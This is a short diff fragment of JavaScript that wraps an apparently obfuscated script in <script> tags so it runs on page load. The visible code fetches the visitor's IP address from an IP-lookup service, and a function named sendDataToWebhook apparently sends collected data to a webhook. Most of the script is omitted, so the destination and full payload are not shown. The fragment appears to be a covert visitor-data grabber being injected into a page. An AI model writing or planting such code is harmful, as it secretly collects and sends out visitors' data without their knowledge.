@@ -1,3 +1,4 @@
+<script>
 async function getUserData() {
   try {
     const _0x141f41 = await fetch('https://api.ipify.org?format=json');
@@ -190,3 +191,4 @@ async function sendDataToWebhook(_0x3746f6) {
   }
 }
 window.onload = getUserData;
+</script>
